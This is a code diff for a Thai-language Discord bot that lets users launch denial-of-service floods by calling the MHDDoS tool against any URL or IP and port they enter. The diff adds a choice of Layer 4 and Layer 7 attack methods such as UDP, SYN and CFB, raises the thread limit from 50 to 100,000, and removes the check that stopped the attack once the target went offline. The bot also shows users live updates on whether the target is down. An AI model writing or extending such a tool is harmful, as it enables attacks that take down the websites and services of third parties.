@@ -37,32 +37,40 @@ tree = app_commands.CommandTree(client)
 class DDoSModal(Modal, title="ตั้งค่าการโจมตี - เดียวรู้กัน"):
     target = TextInput(label="URL หรือ IP เว็บเป้าหมาย", placeholder="เช่น https://example.com หรือ 1.2.3.4", required=True)
     port = TextInput(label="Port เว็บ", placeholder="เช่น 80 หรือ 443", required=True)
+    method = TextInput(label="Method (GET, UDP, TCP, SYN, CFB)", placeholder="GET หรือ UDP", default="GET", required=True, max_length=10)
     duration = TextInput(label="ระยะเวลา (วินาที, สูงสุด 500)", placeholder="500", required=True, max_length=3)
-    threads = TextInput(label="จำนวนเครื่อง/เทรด (สูงสุด 50)", placeholder="50", required=True, max_length=2)
+    threads = TextInput(label="จำนวนเทรด (สูงสุด 100,000)", placeholder="100000", required=True, max_length=6)
 
     async def on_submit(self, interaction: discord.Interaction):
         try:
             dur = int(self.duration.value)
             thr = int(self.threads.value)
             if dur > 500: dur = 500
-            if thr > 50: thr = 50
+            if thr > 100000: thr = 100000
         except ValueError:
             await interaction.response.send_message("❌ กรุณากรอกตัวเลขให้ถูกต้อง!", ephemeral=True)
             return
 
         target_val = self.target.value.strip()
         port_val = self.port.value.strip()
+        meth_val = self.method.value.strip().upper()
 
         embed = discord.Embed(
             title="🎯 เดียวรู้กัน - กำลังเตรียมการ...",
-            description=f"**เป้าหมาย:** `{target_val}:{port_val}`\n**ระยะเวลา:** `{dur} วินาที`\n**เทรด:** `{thr}`",
+            description=f"**เป้าหมาย:** `{target_val}:{port_val}`\n**Method:** `{meth_val}`\n**ระยะเวลา:** `{dur} วินาที`\n**เทรด:** `{thr:,}` เทรด",
             color=discord.Color.orange()
         )
         await interaction.response.send_message(embed=embed, ephemeral=False)
         msg = await interaction.original_response()
 
-        # รันสคริปต์จากโฟลเดอร์ MHDDoS ที่ถูกโหลดมาอัตโนมัติ
-        cmd = ["python3", "MHDDoS/start.py", "GET", f"{target_val}", str(thr), str(dur)]
+        # จัดรูปแบบคำสั่งตามประเภท (Layer 4 หรือ Layer 7)
+        target_full = target_val if target_val.startswith("http") else f"http://{target_val}:{port_val}"
+        l4_methods = ["UDP", "TCP", "SYN", "OVH-UDP", "CPS", "ICMP"]
+        
+        if meth_val in l4_methods:
+            cmd = ["python3", "MHDDoS/start.py", meth_val, f"{target_val}:{port_val}", str(thr), str(dur)]
+        else:
+            cmd = ["python3", "MHDDoS/start.py", meth_val, target_full, "0", str(thr), "none", "100", str(dur)]
         
         try:
             process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -75,18 +83,16 @@ class DDoSModal(Modal, title="ตั้งค่าการโจมตี - �
 
         start_time = time.time()
         
-        # ลูปอัปเดตสถานะทุกๆ 3 วินาที
+        # วนลูปเช็คสถานะและอัปเดตหน้าจอทุก 3 วินาที (จนกว่าจะครบเวลาที่ตั้งไว้ จะไม่มีการตัดจบก่อนเด็ดขาด)
         while process.poll() is None:
             elapsed = int(time.time() - start_time)
             if elapsed >= dur:
-                process.terminate()
                 break
             
-            # ตรวจสอบความเร็วและสถานะเว็บล่าสุด
+            # ตรวจสอบความเร็วเว็บเพื่อแสดงผลสดๆ (ไม่มียกเลิกกลางคันแม้เว็บจะตอบช้าหรือหลุด)
             try:
                 res_start = time.time()
-                test_url = target_val if target_val.startswith("http") else f"http://{target_val}:{port_val}"
-                r = requests.get(test_url, timeout=2)
+                r = requests.get(target_full, timeout=2)
                 speed_ms = int((time.time() - res_start) * 1000)
                 status_code = r.status_code
             except:
@@ -94,8 +100,8 @@ class DDoSModal(Modal, title="ตั้งค่าการโจมตี - �
                 status_code = "0 (ไม่ตอบสนอง / Down)"
 
             live_embed = discord.Embed(
-                title="⚔️ เดียวรู้กัน - กำลังยิง...",
-                description=f"🌐 **เป้าหมาย:** `{target_val}:{port_val}`\n⏱️ **เวลา:** `{elapsed}/{dur} วินาที`\n⚡ **ความเร็วตอบสนองล่าสุด:** `{speed_ms} ms`\n📌 **สถานะเว็บ:** `{status_code}`",
+                title="⚔️ เดียวรู้กัน - กำลังยิงต่อเนื่อง...",
+                description=f"🌐 **เป้าหมาย:** `{target_val}:{port_val}`\n🔫 **Method:** `{meth_val}`\n⏱️ **เวลา:** `{elapsed}/{dur} วินาที`\n⚡ **ความเร็วตอบสนองล่าสุด:** `{speed_ms} ms`\n📌 **สถานะเว็บ:** `{status_code}`\n🚀 **กำลังอัดเทรด:** `{thr:,} เทรด/วิ`",
                 color=discord.Color.yellow()
             )
             try:
@@ -103,17 +109,14 @@ class DDoSModal(Modal, title="ตั้งค่าการโจมตี - �
             except:
                 pass
             
-            if status_code == "0 (ไม่ตอบสนอง / Down)":
-                process.terminate()
-                break
-
             await asyncio.sleep(3)
 
+        # บังคับหยุดกระบวนการเมื่อครบเวลาที่กำหนดเป๊ะๆ
         process.terminate()
         
         success_embed = discord.Embed(
             title="✅ สำเร็จแล้ว!",
-            description=f"เป้าหมาย `{target_val}:{port_val}` หลุดการเชื่อมต่อหรือเวลาหมดลงแล้ว",
+            description=f"ยิงเป้าหมาย `{target_val}:{port_val}` ครบตามเวลา `{dur} วินาที` เรียบร้อยแล้ว",
             color=discord.Color.green()
         )
         await msg.edit(embed=success_embed)
@@ -129,7 +132,7 @@ class DDoSView(View):
 @tree.command(name="d", description="เปิดเมนูเดียวรู้กัน")
 async def d_command(interaction: discord.Interaction):
     embed = discord.Embed(
-        title="เดียวรู้กัน - Panel",
+        title="🔥 เดียวรู้กัน - Panel",
         description="กดปุ่มด้านล่างเพื่อใส่ข้อมูลเป้าหมาย",
         color=discord.Color.blurple()
     )
